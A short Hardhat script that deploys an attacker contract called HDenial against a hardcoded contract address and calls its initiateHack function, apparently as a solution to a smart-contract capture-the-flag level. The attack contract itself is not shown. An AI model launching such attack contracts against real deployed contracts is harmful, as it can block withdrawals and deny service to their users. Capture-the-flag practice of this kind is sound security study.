const hre = require("hardhat");

async function main() {
  const HDenial = await hre.ethers.getContractFactory("HDenial");
  const hDenial = await HDenial.deploy("0x225aEB05E05cFD2447F7234224C7A5BC66Ab645E");
  await hDenial.deployed();
  console.log("HDenial deployed to:", hDenial.address);

  await hDenial.initiateHack();
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
